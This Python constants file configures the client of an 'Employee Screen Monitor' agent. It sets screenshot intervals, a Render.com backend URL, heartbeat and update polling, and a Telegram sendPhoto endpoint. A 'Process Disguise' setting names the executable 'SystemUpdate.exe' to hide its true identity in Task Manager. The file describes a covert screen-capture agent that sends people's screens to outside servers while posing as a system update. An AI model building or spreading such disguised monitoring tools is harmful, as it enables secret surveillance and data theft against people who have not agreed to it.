# constants.py — Central configuration for the Employee Screen Monitor client agent.

import os

# Backend API Configuration — change only if your server URL changes.
# All HTTP requests are made to this endpoint.
BACKEND_URL = "https://screen-monitor-cc1w.onrender.com"  # Replace with your Render.com backend URL

# Screenshot and Delivery Configuration
DEFAULT_INTERVAL_MINUTES = 3               # Default screenshot interval for new clients
MAX_RETRIES = 3                             # Failed send retries
COMPRESSION_QUALITY = 70                    # JPEG quality (0–100)

# Process Disguise
# Set a friendly name to hide the executable’s true name in task manager, etc.
PROCESS_NAME = "SystemUpdate.exe"            # Visible name in task manager

# Local Storage Paths
APP_DATA_DIR = os.path.join(os.getenv('APPDATA'), 'employee-agent')
CLIENT_ID_FILE = os.path.join(APP_DATA_DIR, 'client_id')

# Timing Constants (in seconds)
CONFIG_POLL_INTERVAL = 60      # Poll backend for config every minute
HEARTBEAT_INTERVAL = 30        # Send alive ping every 30 seconds
UPDATE_CHECK_INTERVAL = 600    # Check for updates every 10 minutes

# Telegram Bot API Endpoint Template
TELEGRAM_API_URL = "https://api.telegram.org/bot{token}/sendPhoto"